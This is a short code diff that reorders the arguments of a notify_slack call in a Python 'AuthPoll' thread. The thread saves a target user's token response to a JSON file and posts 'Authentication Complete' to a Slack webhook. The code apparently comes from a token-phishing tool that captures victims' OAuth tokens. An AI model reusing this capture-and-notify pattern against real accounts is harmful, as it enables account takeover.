@@ -92,7 +92,7 @@ class AuthPoll(threading.Thread):
         try:
             with open(f"{self.target_email}.tokeninfo.json", "w") as f:
                 json.dump(tokenResponse, f)
-            notify_slack(self.webhook,ipinfo_key=None,"Authentication Complete",self.target_email,IP=None,useragent=None)
+            notify_slack(self.webhook,"Authentication Complete",self.target_email,IP=None,useragent=None,ipinfo_key=None)
             logging.info(f"[{self.target_email}] Token info saved to {self.target_email}.tokeninfo.json")  # fmt: skip
 
         except Exception as e:
